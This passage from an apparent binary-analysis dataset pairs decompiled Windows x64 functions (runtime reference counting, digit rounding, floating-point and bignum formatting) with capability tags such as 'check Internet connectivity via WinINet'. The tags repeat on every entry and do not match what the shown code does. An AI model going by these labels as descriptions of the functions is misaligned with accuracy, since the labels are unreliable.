0x20;\n            iVar9 = iVar9 + -1;\n            puVar8 = puVar7;\n        } while (iVar9 != 0);\n        *puVar7 = *puVar6;\n    }\n    iVar9 = 2;\n    puVar6 = *(**arg3 + 0x88) + 0x119;\n    if (*0x140040908 != NULL) {\n        puVar8 = *0x140040908;\n        if (puVar6 != NULL) {\n            do {\n                uVar3 = puVar6[1];\n                uVar4 = puVar6[2];\n                uVar5 = puVar6[3];\n                *puVar8 = *puVar6;\n                puVar8[1] = uVar3;\n                puVar8[2] = uVar4;\n                puVar8[3] = uVar5;\n                uVar3 = puVar6[5];\n                uVar4 = puVar6[6];\n                uVar5 = puVar6[7];\n                puVar8[4] = puVar6[4];\n                puVar8[5] = uVar3;\n                puVar8[6] = uVar4;\n                puVar8[7] = uVar5;\n                uVar3 = puVar6[9];\n                uVar4 = puVar6[10];\n                uVar5 = puVar6[0xb];\n                puVar8[8] = puVar6[8];\n                puVar8[9] = uVar3;\n                puVar8[10] = uVar4;\n                puVar8[0xb] = uVar5;\n                uVar3 = puVar6[0xd];\n                uVar4 = puVar6[0xe];\n                uVar5 = puVar6[0xf];\n                puVar8[0xc] = puVar6[0xc];\n                puVar8[0xd] = uVar3;\n                puVar8[0xe] = uVar4;\n                puVar8[0xf] = uVar5;\n                uVar3 = puVar6[0x11];\n                uVar4 = puVar6[0x12];\n                uVar5 = puVar6[0x13];\n                puVar8[0x10] = puVar6[0x10];\n                puVar8[0x11] = uVar3;\n                puVar8[0x12] = uVar4;\n                puVar8[0x13] = uVar5;\n                uVar3 = puVar6[0x15];\n                uVar4 = puVar6[0x16];\n                uVar5 = puVar6[0x17];\n                puVar8[0x14] = puVar6[0x14];\n                puVar8[0x15] = uVar3;\n                puVar8[0x16] = uVar4;\n                puVar8[0x17] = uVar5;\n                uVar3 = puVar6[0x19];\n                uVar4 = puVar6[0x1a];\n                uVar5 = puVar6[0x1b];\n                puVar8[0x18] = puVar6[0x18];\n                puVar8[0x19] = uVar3;\n                puVar8[0x1a] = uVar4;\n                puVar8[0x1b] = uVar5;\n                uVar3 = puVar6[0x1d];\n                uVar4 = puVar6[0x1e];\n                uVar5 = puVar6[0x1f];\n                puVar8[0x1c] = puVar6[0x1c];\n                puVar8[0x1d] = uVar3;\n                puVar8[0x1e] = uVar4;\n                puVar8[0x1f] = uVar5;\n                puVar6 = puVar6 + 0x20;\n                iVar9 = iVar9 + -1;\n                puVar8 = puVar8 + 0x20;\n            } while (iVar9 != 0);\n            goto code_r0x0001400211e8;\n        }\n        fcn.140008040(*0x140040908, 0, 0x100);\n    }\n    puVar6 = fcn.140012c78();\n    *puVar6 = 0x16;\n    fcn.14000c028();\ncode_r0x0001400211e8:\n    piVar2 = **arg3[1];\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if ((iVar1 == 1) && (**arg3[1] != 0x14003e6d0)) {\n        fcn.140019b4c(**arg3[1]);\n    }\n    **arg3[1] = *(**arg3 + 0x88);\n    LOCK();\n    **(**arg3 + 0x88) = **(**arg3 + 0x88) + 1;\n    fcn.140011ef8(*arg4);\n    return;\n}\n",
        "token_count": 2164
    },
    "1400217c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.1400217c4(int64_t arg1, int32_t **arg2)\n\n{\n    int32_t iVar1;\n    ulong arg3;\n    uchar uVar2;\n    unkbyte7 Var3;\n    int32_t *lpMem;\n    \n    uVar2 = SUB81(arg2, 0);\n    Var3 = arg2 >> 8;\n    if (((*(arg1 + 0x3a8) & *0x14003e520) == 0) || (*(arg1 + 0x90) == 0)) {\n        fcn.140011ea4(5);\n        lpMem = *(arg1 + 0x88);\n        if (lpMem != *arg2) {\n            if (lpMem != NULL) {\n                LOCK();\n                iVar1 = *lpMem;\n                *lpMem = *lpMem + -1;\n                if ((iVar1 == 1) && (lpMem != 0x14003e6d0)) {\n                    fcn.140019b4c(lpMem);\n                }\n            }\n            lpMem = *arg2;\n            *(arg1 + 0x88) = lpMem;\n            LOCK();\n            *lpMem = *lpMem + 1;\n        }\n        fcn.140011ef8(5);\n    }\n    else {\n        lpMem = *(arg1 + 0x88);\n    }\n    if (lpMem != NULL) {\n        return lpMem;\n    }\n    fcn.140012b4c();\n    if (*0x14004091c == '\\0') {\n        *0x140040908 = 0x14003ea10;\n        *0x140040910 = 0x14003e6d0;\n        *0x140040900 = 0x14003e900;\n        fcn.140019848(0x14003e900, CONCAT71(Var3, uVar2));\n        fcn.140021554(0xfffffffd, CONCAT71(Var3, 1), arg3, 0x140040910);\n        *0x14004091c = '\\x01';\n    }\n    return 0x1;\n}\n",
        "token_count": 473
    },
    "1400250d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.1400250d4(char *arg1, uint64_t arg2, ulong arg3, int32_t *arg4)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint uVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int64_t iVar10;\n    bool bVar11;\n    int32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        *arg1 = '\\0';\n        iVar4 = 0;\n        if (0 < arg3) {\n            iVar4 = arg3;\n        }\n        if (arg2 <= iVar4 + 1) {\n            uVar7 = 0x22;\n            goto code_r0x000140025101;\n        }\n        if (arg4 != NULL) {\n            pcVar1 = *(arg4 + 2);\n            pcVar8 = arg1 + 1;\n            *arg1 = '0';\n            pcVar9 = pcVar1;\n            for (; 0 < arg3; arg3._0_4_ = arg3 + -1) {\n                cVar3 = *pcVar9;\n                if (cVar3 == '\\0') {\n                    cVar3 = '0';\n                }\n                else {\n                    pcVar9 = pcVar9 + 1;\n                }\n                *pcVar8 = cVar3;\n                pcVar8 = pcVar8 + 1;\n            }\n            *pcVar8 = '\\0';\n            if (arg3 < 0) goto code_r0x00014002520b;\n            iVar4 = *arg4;\n            if (in_stack_00000030 == 0) {\n                bVar11 = '4' < *pcVar9;\ncode_r0x0001400251d1:\n                bVar11 = bVar11 == false;\ncode_r0x0001400251e4:\n                if (bVar11) goto code_r0x00014002520b;\n            }\n            else {\n                iVar5 = fcn.14001ff00();\n                if (iVar5 == 0) {\n                    if (*pcVar9 < '6') {\n                        if (*pcVar9 < '5') goto code_r0x00014002520b;\n                        pcVar6 = pcVar9;\n                        if (in_stack_00000028 != 0) {\n                            do {\n                                pcVar6 = pcVar6 + 1;\n                            } while (*pcVar6 == '0');\n                            if (*pcVar6 == '\\0') {\n                                if (pcVar9 == pcVar1) goto code_r0x00014002520b;\n                                bVar11 = pcVar9[-1] & 1;\n                                goto code_r0x0001400251d1;\n                            }\n                        }\n                    }\n                }\n                else {\n                    if (iVar5 == 0x200) {\n                        if (*pcVar9 == '0') goto code_r0x00014002520b;\n                        bVar11 = iVar4 == 0x2d;\n                        goto code_r0x0001400251e4;\n                    }\n                    if (((iVar5 != 0x100) || (*pcVar9 == '0')) || (iVar4 != 0x2d)) goto code_r0x00014002520b;\n                }\n            }\n            while( true ) {\n                pcVar8 = pcVar8 + -1;\n                if (*pcVar8 != '9') break;\n                *pcVar8 = '0';\n            }\n            *pcVar8 = *pcVar8 + '\\x01';\ncode_r0x00014002520b:\n            if (*arg1 == '1') {\n                arg4[1] = arg4[1] + 1;\n            }\n            else {\n                iVar2 = -1;\n                do {\n                    iVar10 = iVar2;\n                    iVar2 = iVar10 + 1;\n                } while (arg1[iVar10 + 2] != '\\0');\n                fcn.140007990(arg1, arg1 + 1, iVar10 + 2);\n            }\n            return 0;\n        }\n    }\n    uVar7 = 0x16;\ncode_r0x000140025101:\n    *(in_stack_00000038 + 0x2c) = uVar7;\n    *(in_stack_00000038 + 0x30) = 1;\n    fcn.14000bf58(0, 0, 0, 0);\n    return uVar7;\n}\n",
        "token_count": 1033
    },
    "14002525": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140025258(uint32_t *arg1, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    int8_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uint32_t uVar14;\n    int64_t iVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    char *pcVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    bool bVar23;\n    double dVar24;\n    char *in_stack_00000028;\n    int64_t in_stack_00000030;\n    ulong var_160h;\n    ulong var_334h;\n    ulong var_500h;\n    ulong var_6d0h;\n    uchar auStack2072 [32];\n    ulong uStack2040;\n    ulong uStack2024;\n    uint32_t uStack2016;\n    uint32_t uStack2012;\n    uint32_t uStack2008;\n    uint32_t uStack2004;\n    uint32_t uStack2000;\n    uint32_t *puStack1992;\n    uint32_t uStack1984;\n    uint8_t auStack1976 [8];\n    char cStack1968;\n    uint32_t uStack1960;\n    int32_t iStack1956;\n    char *pcStack1952;\n    uint32_t *puStack1944;\n    uint *puStack1936;\n    uint32_t uStack1928;\n    uint32_t auStack1924 [115];\n    uint32_t uStack1464;\n    uint32_t auStack1460 [115];\n    uint32_t uStack1000;\n    uint32_t auStack996 [115];\n    uint32_t uStack536;\n    uint32_t auStack532 [99];\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_6ch;\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e020 ^ auStack2072;\n    pcStack1952 = in_stack_00000028;\n    uStack2024 = arg1;\n    iStack1956 = arg3;\n    puStack1936 = arg4;\n    fcn.140028220(auStack1976);\n    cStack1968 = (auStack1976[0] & 0x1f) != 0x1f;\n    if (cStack1968) {\n        fcn.14002828c(auStack1976);\n    }\n    puVar1 = uStack2024;\n    *(arg4 + 2) = in_stack_00000028;\n    uVar5 = 0x20;\n    if (uStack2024 < 0) {\n        uVar5 = 0x2d;\n    }\n    *arg4 = uVar5;\n    fcn.1400281bc(&uStack1960, 0, 0);\n    uVar8 = puVar1 >> 0x34 & 0x7ff;\n    if (uVar8 == 0) {\n        if (((puVar1 & 0xfffffffffffff) == 0) || ((uStack1960 & 0x1000000) != 0)) {\n            arg4[1] = 0;\n            pcVar18 = 0x140037e94;\ncode_r0x00014002539e:\n            iVar6 = fcn.140018aa0(in_stack_00000028, in_stack_00000030, pcVar18);\njoined_r0x0001400253e4:\n            if (iVar6 != 0) {\n                uStack2040 = 0;\n                fcn.14000c078(0, 0, 0, 0);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            goto code_r0x00014002644d;\n        }\n    }\n    else if (uVar8 == 0x7ff) {\n        if ((puVar1 & 0xfffffffffffff) == 0) {\n            uVar22 = 1;\n        }\n        else if ((puVar1 < 0) && ((puVar1 & 0xfffffffffffff) == 0x8000000000000)) {\n            uVar22 = 4;\n        }\n        else {\n            uVar22 = ~(puVar1 >> 0x33) & 1 | 2;\n        }\n        arg4[1] = 1;\n        if (uVar22 != 1) {\n            if (uVar22 == 2) {\n                pcVar18 = \"1#QNAN\";\n            }\n            else if (uVar22 == 3) {\n                pcVar18 = \"1#SNAN\";\n            }\n            else {\n                if (uVar22 != 4) goto code_r0x0001400253ef;\n                pcVar18 = \"1#IND\";\n            }\n            goto code_r0x00014002539e;\n        }\n        iVar6 = fcn.140018aa0(in_stack_00000028, in_stack_00000030, \"1#INF\");\n        goto joined_r0x0001400253e4;\n    }\ncode_r0x0001400253ef:\n    uStack2024 = puVar1 & 0x7fffffffffffffff;\n    uStack1984 = arg2 + 1;\n    iVar15 = (-(uStack2024 >> 0x34 != 0) & 0x10000000000000) + (puVar1 & 0xfffffffffffff);\n    uVar21 = (2 - (uStack2024 >> 0x34 != 0)) + (uStack2024 >> 0x34);\n    puStack1992 = uStack2024;\n    fcn.1400283a0();\n    dVar24 = fcn.1400282dc();\n    auStack1924[0] = iVar15;\n    uStack2016 = -((dVar24 + 0x80000001U & 0xfffffffe) != 0) & dVar24;\n    auStack1924[1] = iVar15 >> 0x20;\n    uVar22 = auStack1924[1] != 0;\n    uVar14 = uVar22 + 1;\n    if (uVar21 < 0x434) {\n        if (uVar21 == 0x36) {\ncode_r0x000140025803:\n            uStack2024 = uStack2024._4_4_ << 0x20;\n            puVar1 = auStack1924 + (-(auStack1924[1] != 0) & 4);\n            iVar6 = 0x1f;\n            bVar23 = *puVar1 == 0;\n            if (!bVar23) {\n                for (; *puVar1 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            if (bVar23) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = iVar6 + 1;\n            }\n            uVar22 = (iVar6 == 0x20) + uVar14;\n            if (uVar22 < 0x74) {\n                uVar16 = uVar22 - 1;\n                while (uVar16 != 0xffffffff) {\n                    uVar20 = uVar16 - 1;\n                    if (uVar16 < uVar14) {\n                        uVar7 = auStack1924[uVar16];\n                    }\n                    else {\n                        uVar7 = 0;\n                    }\n                    if (uVar20 < uVar14) {\n                        uVar11 = auStack1924[uVar20];\n                    }\n                    else {\n                        uVar11 = 0;\n                    }\n                    auStack1924[uVar16] = uVar11 >> 0x1f | uVar7 * 2;\n                    uVar16 = uVar20;\n                }\n            }\n            else {\n                uVar22 = 0;\n            }\n            uVar14 = 0x435 - uVar21 >> 5;\n            uStack1928 = uVar22;\n            fcn.140008040(auStack996, 0, uVar14 * 4);\n            auStack996[uVar14] = 1 << (0x435 - uVar21 & 0x1f);\n        }\n        else {\n            auStack996[1] = 0x100000;\n            auStack996[0] = 0;\n            uStack1000 = 2;\n            if (auStack1924[1] == 0) goto code_r0x000140025803;\n            uVar8 = 0;\n            do {\n                if (auStack996[uVar8] != auStack1924[uVar8]) goto code_r0x000140025803;\n                uVar22 = uVar8 + 1;\n                uVar8 = uVar22;\n            } while (uVar22 != 2);\n            uStack2024 = uStack2024._4_4_ << 0x20;\n            iVar6 = 0x1f;\n            if (auStack1924[1] != 0) {\n                for (; auStack1924[1] >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            if (auStack1924[1] == 0) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = iVar6 + 1;\n            }\n            uVar22 = (0x20U - iVar6 < 2) + uVar14;\n            if (uVar22 < 0x74) {\n                uVar16 = uVar22 - 1;\n                while (uVar16 != 0xffffffff) {\n                    uVar20 = uVar16 - 1;\n                    if (uVar16 < uVar14) {\n                        uVar7 = auStack1924[uVar16];\n                    }\n                    else {\n                        uVar7 = 0;\n                    }\n                    if (uVar20 < uVar14) {\n                        uVar11 = auStack1924[uVar20];\n                    }\n                    else {\n                        uVar11 = 0;\n                    }\n                    auStack1924[uVar16] = uVar11 >> 0x1e | uVar7 * 4;\n                    uVar16 = uVar20;\n                }\n            }\n            else {\n                uVar22 = 0;\n            }\n            uVar14 = 0x436 - uVar21 >> 5;\n            uStack1928 = uVar22;\n            fcn.140008040(auStack996, 0, uVar14 * 4);\n            auStack996[uVar14] = 1 << (0x436 - uVar21 & 0x1f);\n        }\n        uStack1000 = uVar14 + 1;\n        uVar8 = uStack1000;\n        uStack1464 = uStack1000;\n        if (uVar8 != 0) {\n            if (uVar8 << 2 < 0x1cd) {\n                fcn.140007990(auStack1460, auStack996, uVar8 << 2);\n            }\n            else {\n                fcn.140008040(auStack1460, 0, 0x1cc);\n                puVar9 = fcn.140012c78();\n                *puVar9 = 0x22;\n                fcn.14000c028();\n            }\n            uVar8 = uStack1464;\n        }\n    }\n    else {\n        auStack996[1] = 0x100000;\n        auStack996[0] = 0;\n        uStack1000 = 2;\n        if (auStack1924[1] == 0) {\ncode_r0x0001400255c7:\n            uStack2024 = uStack2024._4_4_ << 0x20;\n            uVar20 = uVar21 - 0x433 & 0x1f;\n            uVar21 = uVar21 - 0x433 >> 5;\n            iVar4 = uVar20;\n            uVar10 = 0x20 - iVar4;\n            uVar16 = (1 << (uVar10 & 0x3f)) - 1;\n            iVar6 = 0x1f;\n            bVar23 = auStack1924[uVar22] == 0;\n            if (!bVar23) {\n                for (; auStack1924[uVar22] >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            if (bVar23) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = iVar6 + 1;\n            }\n            if ((uVar14 + uVar21 < 0x74) && (uVar22 = (0x20U - iVar6 < uVar20) + uVar14 + uVar21,  uVar22 < 0x74)) {\n                uVar20 = uVar22;\n                while (uVar20 = uVar20 - 1,  uVar20 != uVar21 - 1) {\n                    uVar7 = uVar20 - uVar21;\n                    if (uVar7 < uVar14) {\n                        uVar11 = auStack1924[uVar7];\n                    }\n                    else {\n                        uVar11 = 0;\n                    }\n                    if (uVar7 - 1 < uVar14) {\n                        uVar7 = auStack1924[uVar7 - 1];\n                    }\n                    else {\n                        uVar7 = 0;\n                    }\n                    auStack1924[uVar20] = (uVar7 & ~uVar16) >> (uVar10 & 0x1f) | (uVar11 & uVar16) << iVar4;\n                }\n                uVar8 = 0;\n                if (uVar21 != 0) {\n                    do {\n                        auStack1924[uVar8] = 0;\n                        uVar14 = uVar8 + 1;\n                        uVar8 = uVar14;\n                    } while (uVar14 != uVar21);\n                }\n            }\n            else {\n                uVar22 = 0;\n            }\n            uVar8 = 1;\n            uStack1464 = 1;\n            auStack1460[0] = 2;\n            uStack1928 = uVar22;\n        }\n        else {\n            uVar8 = 0;\n            do {\n                if (auStack996[uVar8] != auStack1924[uVar8]) goto code_r0x0001400255c7;\n                uVar16 = uVar8 + 1;\n                uVar8 = uVar16;\n            } while (uVar16 != 2);\n            uStack2024 = uStack2024._4_4_ << 0x20;\n            uVar20 = uVar21 - 0x432 & 0x1f;\n            uVar21 = uVar21 - 0x432 >> 5;\n            iVar4 = uVar20;\n            uVar10 = 0x20 - iVar4;\n            uVar16 = (1 << (uVar10 & 0x3f)) - 1;\n            iVar6 = 0x1f;\n            bVar23 = auStack1924[uVar22] == 0;\n            if (!bVar23) {\n                for (; auStack1924[uVar22] >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            if (bVar23) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = iVar6 + 1;\n            }\n            if ((uVar14 + uVar21 < 0x74) && (uVar22 = (0x20U - iVar6 < uVar20) + uVar14 + uVar21,  uVar22 < 0x74)) {\n                uVar20 = uVar22;\n                while (uVar20 = uVar20 - 1,  uVar20 != uVar21 - 1) {\n                    uVar7 = uVar20 - uVar21;\n                    if (uVar7 < uVar14) {\n                        uVar11 = auStack1924[uVar7];\n                    }\n                    else {\n                        uVar11 = 0;\n                    }\n                    if (uVar7 - 1 < uVar14) {\n                        uVar7 = auStack1924[uVar7 - 1];\n                    }\n                    else {\n                        uVar7 = 0;\n                    }\n                    auStack1924[uVar20] = (uVar7 & ~uVar16) >> (uVar10 & 0x1f) | (uVar11 & uVar16) << iVar4;\n                }\n                uVar8 = 0;\n                if (uVar21 != 0) {\n                    do {\n                        auStack1924[uVar8] = 0;\n                        uVar14 = uVar8 + 1;\n                        uVar8 = uVar14;\n                    } while (uVar14 != uVar21);\n                }\n            }\n            else {\n                uVar22 = 0;\n            }\n            uVar8 = 1;\n            uStack1464 = 1;\n            auStack1460[0] = 4;\n            uStack1928 = uVar22;\n        }\n    }\n    uVar14 = uVar8;\n    if (uStack2016 < 0) {\n        uStack2004 = -uStack2016;\n        uVar8 = uStack2004 / 10;\n        uStack2024._0_4_ = uVar8;\n        uStack2024 = uStack2024 & 0xffffffff00000000 | uVar8;\n        uStack2012 = uStack2024;\n        if (uStack2024 != 0) {\n            do {\n                uStack2000 = uVar8;\n                if (0x26 < uStack2000) {\n                    uStack2000 = 0x26;\n                }\n                uVar21 = uStack2000 - 1;\n                uVar10 = *(uVar21 * 4 + 0x14002ed12);\n                uVar2 = *(uVar21 * 4 + 0x14002ed13);\n                uStack1000 = uVar2 + uVar10;\n                fcn.140008040(auStack996, 0, uVar10 * 4);\n                fcn.140007990(auStack996 + uVar10, *(uVar21 * 4 + 0x14002ed10) * 4 + 0x14002e400, uVar2 << 2);\n                uVar21 = auStack1924[0];\n                if (uStack1000 < 2) {\n                    uVar8 = auStack996[0];\n                    if (auStack996[0] == 0) {\ncode_r0x000140025e91:\n                        uVar22 = 0;\n                        uStack1928 = uVar22;\ncode_r0x000140025fa2:\n                        bVar23 = true;\n                    }\n                    else {\n                        if ((auStack996[0] == 1) || (uVar22 == 0)) goto code_r0x000140025fa2;\n                        uVar19 = 0;\n                        uVar13 = 0;\n                        do {\n                            uVar12 = auStack1924[uVar13] * uVar8 + uVar19;\n                            auStack1924[uVar13] = uVar12;\n                            uVar19 = uVar12 >> 0x20;\n                            uVar21 = uVar12 >> 0x20;\n                            uVar16 = uVar13 + 1;\n                            uVar13 = uVar16;\n                        } while (uVar16 != uVar22);\ncode_r0x000140025f73:\n                        uVar22 = uStack1928;\n                        if (uVar21 == 0) goto code_r0x000140025fa2;\n                        if (uStack1928 < 0x73) {\n                            auStack1924[uStack1928] = uVar21;\n                            uVar22 = uStack1928 + 1;\n                            uStack1928 = uVar22;\n                            goto code_r0x000140025fa2;\n                        }\n                        uVar22 = 0;\n                        bVar23 = false;\n                        uStack1928 = 0;\n                    }\n                    if (!bVar23) goto code_r0x000140025fad;\n                }\n                else {\n                    if (uVar22 < 2) {\n                        uVar8 = auStack1924[0];\n                        uVar19 = uStack1000 << 2;\n                        uStack1928 = uStack1000;\n                        if (uStack1000 != 0) {\n                            if (uVar19 < 0x1cd) {\n                                fcn.140007990(auStack1924, auStack996, uVar19);\n                            }\n                            else {\n                                fcn.140008040(auStack1924, 0, 0x1cc);\n                                puVar9 = fcn.140012c78();\n                                *puVar9 = 0x22;\n                                fcn.14000c028();\n                            }\n                        }\n                        if (uVar21 != 0) {\n                            uVar22 = uStack1928;\n                            if ((uVar21 != 1) && (uStack1928 != 0)) {\n                                uVar19 = 0;\n                                uVar13 = 0;\n                                do {\n                                    uVar12 = auStack1924[uVar13] * uVar8 + uVar19;\n                                    auStack1924[uVar13] = uVar12;\n                                    uVar19 = uVar12 >> 0x20;\n                                    uVar21 = uVar12 >> 0x20;\n                                    uVar22 = uVar13 + 1;\n                                    uVar13 = uVar22;\n                                } while (uVar22 != uStack1928);\n                                goto code_r0x000140025f73;\n                            }\n                            goto code_r0x000140025fa2;\n                        }\n                        goto code_r0x000140025e91;\n                    }\n                    bVar23 = uStack1000 < uVar22;\n                    puStack1944 = auStack996;\n                    if (!bVar23) {\n                        puStack1944 = auStack1924;\n                    }\n                    puStack1992 = auStack996;\n                    uStack2008 = uVar22;\n                    if (bVar23) {\n                        uStack2008 = uStack1000;\n                    }\n                    uVar21 = uStack1000;\n                    if (bVar23) {\n                        uVar21 = uVar22;\n                        puStack1992 = auStack1924;\n                    }\n                    uStack1928 = 0;\n                    uVar8 = 0;\n                    uStack536 = 0;\n                    if (uStack2008 != 0) {\n                        do {\n                            uVar22 = puStack1944[uVar8];\n                            uVar16 = uVar8;\n                            if (uVar22 == 0) {\n                                if (uVar16 == uStack1928) {\n                                    auStack532[uVar8] = 0;\n                                    uStack1928 = uVar16 + 1;\n                                    uStack536 = uStack1928;\n                                }\n                            }\n                            else {\n                                uVar19 = 0;\n                                if (uVar21 != 0) {\n                                    do {\n                                        uVar20 = uVar8;\n                                        uVar13 = uVar8;\n                                        if (uVar20 == 0x73) break;\n                                        if (uVar20 == uStack1928) {\n                                            auStack532[uVar8] = 0;\n                                            uStack536 = uVar20 + 1;\n                                        }\n                                        uVar13 = uVar20 + 1;\n                                        uVar19 = puStack1992[-uVar16 + uVar20] * uVar22 + auStack532[uVar8] + uVar19;\n                                        auStack532[uVar8] = uVar19;\n                                        uVar19 = uVar19 >> 0x20;\n                                        uVar8 = uVar13;\n                                        uStack1928 = uStack536;\n                                    } while (-uVar16 + uVar20 + 1 != uVar21);\n                                    uVar22 = uVar19;\n                                    uVar8 = uVar13;\n                                    while (uVar22 != 0) {\n                                        uVar20 = uVar8;\n                                        if (uVar20 == 0x73) goto code_r0x000140025fad;\n                                        if (uVar20 == uStack1928) {\n                                            auStack532[uVar8] = 0;\n                                            uStack536 = uVar20 + 1;\n                                        }\n                                        uVar22 = auStack532[uVar8];\n                                        auStack532[uVar8] = uVar22 + uVar19;\n                                        uVar22 = uVar22 + uVar19 >> 0x20;\n                                        uVar19 = uVar22;\n                                        uVar8 = uVar20 + 1;\n                                        uStack1928 = uStack536;\n                                    }\n                                }\n                                if (uVar8 == 0x73) goto code_r0x000140025fad;\n                            }\n                            uVar8 = uVar16 + 1;\n                        } while (uVar16 + 1 != uStack2008);\n                    }\n                    uVar8 = uStack1928 << 2;\n                    uVar22 = uStack1928;\n                    if (uStack1928 != 0) {\n                        if (uVar8 < 0x1cd) {\n                            fcn.140007990(auStack1924, auStack532, uVar8);\n                            uVar22 = uStack1928;\n                        }\n                        else {\n                            fcn.140008040(auStack1924, 0, 0x1cc);\n                            puVar9 = fcn.140012c78();\n                            *puVar9 = 0x22;\n                            fcn.14000c028();\n                            uVar22 = uStack1928;\n                        }\n                    }\n                }\n                uStack2012 = uStack2012 - uStack2000;\n                uVar8 = uStack2012;\n            } while (uStack2012 != 0);\n        }\n        iVar6 = uStack2004 + uStack2024 * -10;\n        if (iVar6 == 0) goto code_r0x000140025af9;\n        uVar21 = *((iVar6 - 1) * 4 + 0x14002eda8);\n        if (uVar21 != 0) {\n            if ((uVar21 != 1) && (uVar22 != 0)) {\n                uVar8 = 0;\n                uVar19 = 0;\n                do {\n                    uVar13 = auStack1924[uVar19] * uVar21 + uVar8;\n                    auStack1924[uVar19] = uVar13;\n                    uVar8 = uVar13 >> 0x20;\n                    uVar16 = uVar19 + 1;\n                    uVar19 = uVar16;\n                } while (uVar16 != uVar22);\n                uVar21 = uVar13 >> 0x20;\n                uVar22 = uStack1928;\n                if (uVar21 != 0) {\n                    if (0x72 < uStack1928) goto code_r0x000140025fad;\n                    auStack1924[uStack1928] = uVar21;\n                    uStack1928 = uStack1928 + 1;\n                    uVar22 = uStack1928;\n                }\n            }\n            goto code_r0x000140025af9;\n        }\ncode_r0x000140025fad:\n        uStack1928 = 0;\n    }\n    else {\n        uVar19 = uStack2016 / 10;\n        uStack2008 = uVar19;\n        uStack2000 = uStack2008;\n        while (uStack2008 != 0) {\n            uVar14 = uVar8;\n            uStack2004 = uVar19;\n            if (0x26 < uStack2004) {\n                uStack2004 = 0x26;\n            }\n            uVar21 = uStack2004 - 1;\n            uVar10 = *(uVar21 * 4 + 0x14002ed12);\n            uVar2 = *(uVar21 * 4 + 0x14002ed13);\n            uStack1000 = uVar2 + uVar10;\n            fcn.140008040(auStack996, 0, uVar10 * 4);\n            fcn.140007990(auStack996 + uVar10, *(uVar21 * 4 + 0x14002ed10) * 4 + 0x14002e400, uVar2 << 2);\n            uVar21 = auStack1460[0];\n            if (uStack1000 < 2) {\n                uVar19 = auStack996[0];\n                if (auStack996[0] == 0) {\ncode_r0x0001400259a6:\n                    uVar8 = 0;\ncode_r0x000140025ac6:\n                    uStack1464 = uVar8;\ncode_r0x000140025ae4:\n                    bVar23 = true;\n                }\n                else {\n                    if ((auStack996[0] == 1) || (uVar14 == 0)) goto code_r0x000140025ae4;\n                    uVar8 = 0;\n                    uVar13 = 0;\n                    do {\n                        uVar12 = auStack1460[uVar13] * uVar19 + uVar8;\n                        auStack1460[uVar13] = uVar12;\n                        uVar8 = uVar12 >> 0x20;\n                        uVar21 = uVar12 >> 0x20;\n                        uVar16 = uVar13 + 1;\n                        uVar13 = uVar16;\n                    } while (uVar16 != uVar14);\ncode_r0x000140025aa0:\n                    if (uVar21 == 0) {\n                        uVar8 = uStack1464;\n                        goto code_r0x000140025ae4;\n                    }\n                    if (uStack1464 < 0x73) {\n                        auStack1460[uStack1464] = uVar21;\n                        uVar8 = uStack1464 + 1;\n                        goto code_r0x000140025ac6;\n                    }\n                    uVar8 = 0;\n                    bVar23 = false;\n                    uStack1464 = 0;\n                }\n                if (!bVar23) goto code_r0x000140025aef;\n            }\n            else {\n                if (uVar14 < 2) {\n                    uVar19 = auStack1460[0];\n                    uVar8 = uStack1000 << 2;\n                    uStack1464 = uStack1000;\n                    if (uStack1000 != 0) {\n                        if (uVar8 < 0x1cd) {\n                            fcn.140007990(auStack1460, auStack996, uVar8);\n                        }\n                        else {\n                            fcn.140008040(auStack1460, 0, 0x1cc);\n                            puVar9 = fcn.140012c78();\n                            *puVar9 = 0x22;\n                            fcn.14000c028();\n                        }\n                    }\n                    uVar8 = uStack1464;\n                    if (uVar21 != 0) {\n                        if ((uVar21 != 1) && (uStack1464 != 0)) {\n                            uVar8 = 0;\n                            uVar13 = 0;\n                            do {\n                                uVar12 = auStack1460[uVar13] * uVar19 + uVar8;\n                                auStack1460[uVar13] = uVar12;\n                                uVar8 = uVar12 